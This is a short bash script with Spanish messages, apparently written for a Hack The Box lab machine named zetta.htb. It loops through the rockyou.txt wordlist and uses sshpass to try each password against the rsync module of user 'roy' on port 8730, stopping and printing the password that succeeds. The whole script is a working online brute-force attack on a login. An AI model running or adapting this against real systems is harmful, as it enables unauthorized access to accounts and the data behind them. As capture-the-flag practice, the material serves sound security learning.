````bash
#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Saliendo...\n"
  tput cnorm; exit 1
}

#Ctrl+C
trap ctrl_c INT

tput civis

for password in $(cat /usr/share/wordlists/rockyou.txt); do
  sshpass -p "$password" rsync rsync://roy@zetta.htb:8730/home_roy &>/dev/null

  if [ "$(echo $?)" == "0" ]; then
    echo -e "\n[+] La password correcta es $password"
    tput cnorm; exit 0
  fi
done

tput cnorm
````
